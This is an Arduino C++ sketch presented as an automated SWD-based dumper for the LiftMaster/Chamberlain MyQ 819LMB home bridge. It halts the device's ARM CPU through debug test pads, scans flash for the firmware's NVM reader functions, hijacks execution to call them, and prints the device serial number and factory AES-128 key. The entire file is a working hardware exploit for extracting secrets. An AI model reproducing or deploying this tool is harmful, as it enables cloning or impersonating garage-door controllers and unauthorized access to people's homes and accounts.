/*
 * LiftMaster / Chamberlain MyQ Home Bridge (819LMB)
 * Automated Hardware AES-128 Key & Serial Dumper
 * Target SoC: Marvell 88MW300 (ARM Cortex-M4F)
 * Debug Interface: Serial Wire Debug (SWD)
 * Baud Rate: 115200 baud
 */

#include <Arduino.h>

const int PIN_SWCLK = 9;
const int PIN_SWDIO = 8;

// Standard ARM Cortex-M CoreSight Debug Architecture Registers
// (Defined by ARM architecture specification for all Cortex-M processors)
const uint32_t DHCSR = 0xE000EDF0; // Debug Halting Control & Status Register
const uint32_t DCRSR = 0xE000EDF4; // Debug Core Register Selector Register
const uint32_t DCRDR = 0xE000EDF8; // Debug Core Register Data Register

// Unique Thumb-2 machine code signatures for Marvell MyQ NVM reader:
// nvm_rd_myq_aes_key_encrypted prologue:
//   push {r0-r4, lr}; add r3, sp, #12
const uint32_t SIG_ENC_WORD1 = 0xAB03B51F;
const uint16_t SIG_ENC_STR3  = 0x9300;

inline void swdio_low()  { pinMode(PIN_SWDIO, OUTPUT); digitalWrite(PIN_SWDIO, LOW); }
inline void swdio_high() { pinMode(PIN_SWDIO, INPUT_PULLUP); }
inline void swclk_low()  { pinMode(PIN_SWCLK, OUTPUT); digitalWrite(PIN_SWCLK, LOW); }
inline void swclk_high() { pinMode(PIN_SWCLK, INPUT_PULLUP); }
inline void swd_delay()  { delayMicroseconds(2); }

inline void swd_clk() {
  swclk_high();
  swd_delay();
  swclk_low();
  swd_delay();
}

void swd_write_bit(uint8_t bit) {
  if (bit) swdio_high(); else swdio_low();
  swd_delay();
  swd_clk();
}

uint8_t swd_read_bit() {
  swdio_high();
  swclk_high();
  swd_delay();
  uint8_t bit = digitalRead(PIN_SWDIO);
  swclk_low();
  swd_delay();
  return bit;
}

void swd_idle(int cycles) {
  swdio_low();
  for (int i = 0; i < cycles; i++) swd_clk();
}

void swd_reset_and_switch() {
  swdio_high();
  swd_delay();
  for (int i = 0; i < 60; i++) swd_clk();

  uint16_t switch_seq = 0xE79E;
  for (int i = 0; i < 16; i++) {
    swd_write_bit(switch_seq & 1);
    switch_seq >>= 1;
  }

  swdio_high();
  swd_delay();
  for (int i = 0; i < 60; i++) swd_clk();
  swd_idle(16);
}

uint8_t swd_header(uint8_t ap, uint8_t rnw, uint8_t reg) {
  uint8_t a2 = (reg >> 2) & 1;
  uint8_t a3 = (reg >> 3) & 1;
  uint8_t p = ap ^ rnw ^ a2 ^ a3;
  return 1 | (ap << 1) | (rnw << 2) | (a2 << 3) | (a3 << 4) | (p << 5) | (1 << 7);
}

uint8_t swd_read_reg(uint8_t ap, uint8_t reg, uint32_t *val_out) {
  uint8_t req = swd_header(ap, 1, reg);
  for (int i = 0; i < 8; i++) { swd_write_bit(req & 1); req >>= 1; }
  swdio_high(); swd_clk();

  uint8_t ack = 0;
  for (int i = 0; i < 3; i++) ack |= (swd_read_bit() << i);
  if (ack != 1) { swd_idle(8); return ack; }

  uint32_t val = 0;
  for (int i = 0; i < 32; i++) {
    if (swd_read_bit()) val |= (1UL << i);
  }
  swd_read_bit();
  swd_idle(8);
  *val_out = val;
  return 1;
}

uint8_t swd_write_reg(uint8_t ap, uint8_t reg, uint32_t val) {
  uint8_t req = swd_header(ap, 0, reg);
  for (int i = 0; i < 8; i++) { swd_write_bit(req & 1); req >>= 1; }
  swdio_high(); swd_clk();

  uint8_t ack = 0;
  for (int i = 0; i < 3; i++) ack |= (swd_read_bit() << i);
  if (ack != 1) { swd_idle(8); return ack; }

  swdio_low(); swd_clk();

  uint8_t parity = 0;
  for (int i = 0; i < 32; i++) {
    uint8_t b = (val >> i) & 1;
    parity ^= b;
    swd_write_bit(b);
  }
  swd_write_bit(parity);
  swd_idle(8);
  return 1;
}

bool ensure_swd() {
  for (int attempt = 0; attempt < 5; attempt++) {
    swd_reset_and_switch();
    uint32_t idcode = 0;
    if (swd_read_reg(0, 0x0, &idcode) == 1) {
      if ((idcode & 0x0FFF) == 0x0477 || idcode == 0x2BA01477) {
        swd_write_reg(0, 0x0, 0x0000001E); // Clear ABORT
        swd_write_reg(0, 0x4, 0x50000000); // Power up debug & system
        swd_write_reg(0, 0x8, 0x00000000); // AP 0
        swd_write_reg(1, 0x0, 0x23000002); // CSW: 32-bit transfer
        return true;
      }
    }
    delay(10);
  }
  return false;
}

bool mem_read32(uint32_t addr, uint32_t *val_out) {
  swd_write_reg(0, 0x8, 0x00000000);
  if (swd_write_reg(1, 0x4, addr) != 1) return false;
  uint32_t dummy = 0;
  swd_read_reg(1, 0xC, &dummy);
  return (swd_read_reg(0, 0xC, val_out) == 1);
}

bool mem_write32(uint32_t addr, uint32_t val) {
  swd_write_reg(0, 0x8, 0x00000000);
  if (swd_write_reg(1, 0x4, addr) != 1) return false;
  return (swd_write_reg(1, 0xC, val) == 1);
}

bool halt_cpu() {
  mem_write32(DHCSR, 0xA05F0003); // C_DEBUGEN | C_HALT
  for (int i = 0; i < 50; i++) {
    uint32_t dhcsr = 0;
    if (mem_read32(DHCSR, &dhcsr) && (dhcsr & (1UL << 17))) {
      return true;
    }
    delay(2);
  }
  return false;
}

void resume_cpu() {
  mem_write32(DHCSR, 0xA05F0001); // C_DEBUGEN only
}

uint32_t read_core_reg(uint8_t reg_id) {
  mem_write32(DCRSR, reg_id & 0x1F);
  for (int i = 0; i < 50; i++) {
    uint32_t dhcsr = 0;
    if (mem_read32(DHCSR, &dhcsr) && (dhcsr & (1UL << 16))) break;
    delayMicroseconds(50);
  }
  uint32_t val = 0;
  mem_read32(DCRDR, &val);
  return val;
}

void write_core_reg(uint8_t reg_id, uint32_t val) {
  mem_write32(DCRDR, val);
  mem_write32(DCRSR, (reg_id & 0x1F) | 0x00010000);
  for (int i = 0; i < 50; i++) {
    uint32_t dhcsr = 0;
    if (mem_read32(DHCSR, &dhcsr) && (dhcsr & (1UL << 16))) break;
    delayMicroseconds(50);
  }
}

void print_hex_byte(uint8_t b) {
  if (b < 0x10) Serial.print('0');
  Serial.print(b, HEX);
}

// 100% Dynamic flash scan across the entire executable flash space (0x1F000000 - 0x1F070000)
// Uses high-speed hardware Auto-Increment to find the unique NVM function opcodes.
// Automatically catches probe disconnects mid-scan and resumes without losing progress!
uint32_t scan_flash_for_nvm_function() {
  Serial.println(F("[*] Scanning flash space (0x1F000000 - 0x1F070000) for NVM signatures..."));

  uint32_t addr = 0x1F000000;
  uint32_t end_addr = 0x1F070000;
  uint32_t found_addr = 0;

  unsigned long t0 = millis();

  // Enable Auto-Increment on CSW
  swd_write_reg(0, 0x8, 0x00000000);
  swd_write_reg(1, 0x0, 0x23000012);

  while (addr < end_addr) {
    // Progress indicator every 64 KB
    if ((addr & 0xFFFF) == 0) {
      Serial.print(F("    Scanning 0x"));
      Serial.print(addr, HEX);
      Serial.println(F("..."));
    }

    swd_write_reg(0, 0x8, 0x00000000);
    if (swd_write_reg(1, 0x4, addr) != 1) {
      // Disconnect detected!
      Serial.print(F("\n[!] Probe contact lost at 0x"));
      Serial.print(addr, HEX);
      Serial.println(F(". Pausing scan... re-touch probes to resume."));

      while (true) {
        if (ensure_swd() && halt_cpu()) {
          Serial.print(F("[+] Contact restored! Resuming scan from 0x"));
          Serial.print(addr, HEX);
          Serial.println(F("..."));
          swd_write_reg(0, 0x8, 0x00000000);
          swd_write_reg(1, 0x0, 0x23000012);
          break;
        }
        delay(100);
      }
      continue; // Re-attempt this block
    }

    uint32_t dummy = 0;
    if (swd_read_reg(1, 0xC, &dummy) != 1) {
      continue;
    }

    int fail_count = 0;
    for (int i = 0; i < 64 && addr < end_addr; i++, addr += 4) {
      uint32_t w = 0;
      if (swd_read_reg(1, 0xC, &w) != 1) {
        fail_count++;
        if (fail_count > 3) {
          // Probe slipped mid-block: rewind to start of current 256-byte block
          addr = (addr & ~0xFFUL);
          break;
        }
        continue;
      }
      fail_count = 0;

      if (w == SIG_ENC_WORD1) {
        // Read next word directly from the auto-increment stream
        uint32_t w2 = 0;
        i++;
        addr += 4;
        if (swd_read_reg(1, 0xC, &w2) == 1 && ((w2 & 0xFFFF) == SIG_ENC_STR3)) {
          found_addr = addr - 4;
          break;
        }
      }
    }

    if (found_addr != 0) break;
  }

  unsigned long elapsed = millis() - t0;

  // Restore CSW to standard 32-bit transfer mode
  swd_write_reg(0, 0x8, 0x00000000);
  swd_write_reg(1, 0x0, 0x23000002);

  if (found_addr != 0) {
    Serial.print(F("[+] Discovered NVM function at 0x"));
    Serial.print(found_addr, HEX);
    Serial.print(F(" (scan took "));
    Serial.print(elapsed);
    Serial.println(F(" ms)"));
  }

  return found_addr;
}

// Executes a target firmware function dynamically on the target's own active stack
bool call_native_func(uint32_t func_addr, uint32_t stub_addr, uint32_t buf_addr, uint32_t call_sp, uint8_t *out_buf, uint8_t len) {
  // Clear scratch output buffer on stack
  for (int i = 0; i < 4; i++) {
    mem_write32(buf_addr + i * 4, 0);
  }

  // Setup core registers for call
  write_core_reg(0, buf_addr);               // R0 = destination buffer (on dynamic stack)
  write_core_reg(1, 0);                      // R1 = 0
  write_core_reg(2, 0);                      // R2 = 0
  write_core_reg(3, 0);                      // R3 = 0
  write_core_reg(13, call_sp);               // SP = dynamic stack frame
  write_core_reg(14, stub_addr | 1);         // LR = return stub on stack (Thumb)
  write_core_reg(15, func_addr | 1);         // PC = function entry (Thumb)
  write_core_reg(16, 0x01000000);            // xPSR (Thumb mode active)

  // Resume target to execute function
  resume_cpu();

  // Wait for CPU to hit bkpt #0 stub
  bool hit_bkpt = false;
  for (int i = 0; i < 80; i++) {
    uint32_t dhcsr = 0;
    if (mem_read32(DHCSR, &dhcsr) && (dhcsr & (1UL << 17))) {
      hit_bkpt = true;
      break;
    }
    delay(5);
  }

  if (!hit_bkpt) {
    halt_cpu();
    return false;
  }

  uint32_t ret_r0 = read_core_reg(0);

  // Read result buffer
  for (uint8_t i = 0; i < (len + 3) / 4; i++) {
    uint32_t w = 0;
    mem_read32(buf_addr + i * 4, &w);
    for (int b = 0; b < 4 && (i * 4 + b) < len; b++) {
      out_buf[i * 4 + b] = (w >> (b * 8)) & 0xFF;
    }
  }

  return (ret_r0 == 1);
}

bool dump_credentials() {
  if (!ensure_swd()) return false;

  // 1. Halt CPU first to allow clean memory access
  if (!halt_cpu()) {
    Serial.println(F("[-] Failed to halt CPU"));
    return false;
  }

  // 2. Save registers
  uint32_t saved_regs[16];
  for (uint8_t r = 0; r < 16; r++) {
    saved_regs[r] = read_core_reg(r);
  }
  uint32_t saved_xpsr = read_core_reg(16);

  Serial.print(F("[+] CPU Halted. PC=0x"));
  Serial.print(saved_regs[15], HEX);
  Serial.print(F(", SP=0x"));
  Serial.println(saved_regs[13], HEX);

  if (saved_regs[13] == 0 && saved_regs[15] == 0) {
    Serial.println(F("[!] Probe contact slipped during register capture. Re-touch probes."));
    return false;
  }

  // 3. Dynamic stack allocation (ZERO hardcoded RAM addresses)
  // Stack grows downwards on ARM Cortex-M. We allocate our stub and buffer
  // directly on the target's live active stack frame.
  uint32_t active_sp = saved_regs[13] & ~7UL; // 8-byte aligned per ARM AAPCS
  uint32_t stub_addr = active_sp - 32;        // Breakpoint return stub (4 bytes)
  uint32_t buf_addr  = active_sp - 16;        // Credential output buffer (16 bytes)
  uint32_t call_sp   = active_sp - 128;       // Execution stack frame for native function

  // Backup 32 bytes of stack memory to ensure 100% byte-for-byte non-destructive exit
  uint32_t stack_backup[8];
  for (int i = 0; i < 8; i++) mem_read32(stub_addr + i * 4, &stack_backup[i]);

  // 4. Pure dynamic scan across flash - NO hardcoded slots or offsets
  uint32_t enc_func = scan_flash_for_nvm_function();
  if (enc_func == 0) {
    Serial.println(F("[-] Function signature not found in flash scan!"));
    for (int i = 0; i < 8; i++) mem_write32(stub_addr + i * 4, stack_backup[i]);
    for (uint8_t r = 0; r < 16; r++) write_core_reg(r, saved_regs[r]);
    write_core_reg(16, saved_xpsr);
    resume_cpu();
    return false;
  }

  uint32_t ser_func = enc_func - 0x44;
  uint32_t dec_func = enc_func + 0x60;

  Serial.print(F("[+] Target nvm_rd_myq_serial  at: 0x"));
  Serial.println(ser_func, HEX);
  Serial.print(F("[+] Target nvm_rd_myq_aes_key at: 0x"));
  Serial.println(dec_func, HEX);

  // 5. Write return stub on dynamic stack: bkpt #0 (0xBE00), b.n . (0xE7FE)
  mem_write32(stub_addr, 0xE7FEBE00);

  // 6. Read Serial Number on dynamic stack
  char serial_buf[16];
  memset(serial_buf, 0, sizeof(serial_buf));
  bool ser_ok = call_native_func(ser_func, stub_addr, buf_addr, call_sp, (uint8_t*)serial_buf, 10);
  serial_buf[10] = '\0';

  // 7. Read Factory AES Key on dynamic stack
  uint8_t key_buf[16];
  memset(key_buf, 0, sizeof(key_buf));
  bool key_ok = call_native_func(dec_func, stub_addr, buf_addr, call_sp, key_buf, 16);

  // 8. Restore the original stack memory (100% clean memory exit)
  for (int i = 0; i < 8; i++) mem_write32(stub_addr + i * 4, stack_backup[i]);

  // 9. Restore original CPU registers and resume bridge
  for (uint8_t r = 0; r < 16; r++) {
    write_core_reg(r, saved_regs[r]);
  }
  write_core_reg(16, saved_xpsr);
  resume_cpu();
  Serial.println(F("[+] Target stack and CPU state restored. Bridge resumed."));

  // 10. Validate output
  bool key_valid = false;
  for (int i = 0; i < 16; i++) {
    if (key_buf[i] != 0) key_valid = true;
  }
  bool ser_valid = (strlen(serial_buf) >= 8);

  if (ser_ok && key_ok && key_valid && ser_valid) {
    Serial.println(F("\n====================================================="));
    Serial.println(F(">>> EXTRACTION SUCCESSFUL! <<<"));
    Serial.print(F("    Serial Number : "));
    Serial.println(serial_buf);
    Serial.print(F("    AES-128 Key   : "));
    for (int i = 0; i < 16; i++) print_hex_byte(key_buf[i]);
    Serial.println();
    Serial.println(F("====================================================="));
    return true;
  } else {
    Serial.println(F("[-] Extraction returned invalid or empty credentials."));
    return false;
  }
}

bool extracted = false;
uint32_t last_dot_time = 0;

void setup() {
  Serial.begin(115200);
  swclk_low();
  swdio_high();
  delay(1000);

  Serial.println(F("\n====================================================="));
  Serial.println(F("  LiftMaster 819LMB Hardware Credentials Dumper"));
  Serial.println(F("====================================================="));
  Serial.println(F("[*] Armed and waiting for probe contact on test pads..."));
  Serial.println(F("    Pins: D8 (SWDIO) -> Pad 2, D9 (SWCLK) -> Pad 4, GND -> GND"));
}

void loop() {
  if (extracted) {
    delay(1000);
    return;
  }

  uint32_t idcode = 0;
  swd_reset_and_switch();
  uint8_t ack = swd_read_reg(0, 0x0, &idcode);

  if (ack == 1 && ((idcode & 0x0FFF) == 0x0477 || idcode == 0x2BA01477)) {
    Serial.println();
    Serial.println(F("-----------------------------------------------------"));
    Serial.print(F("[+] Contact detected! ARM CoreSight IDCODE: 0x"));
    Serial.println(idcode, HEX);

    if (dump_credentials()) {
      extracted = true;
      Serial.println(F("\nExtraction complete. Probes may be safely disconnected."));
    } else {
      Serial.println(F("[-] Extraction incomplete. Re-arming in 1 second..."));
      delay(1000);
    }
  } else {
    if (millis() - last_dot_time > 400) {
      Serial.print('.');
      last_dot_time = millis();
    }
    delay(30);
  }
}
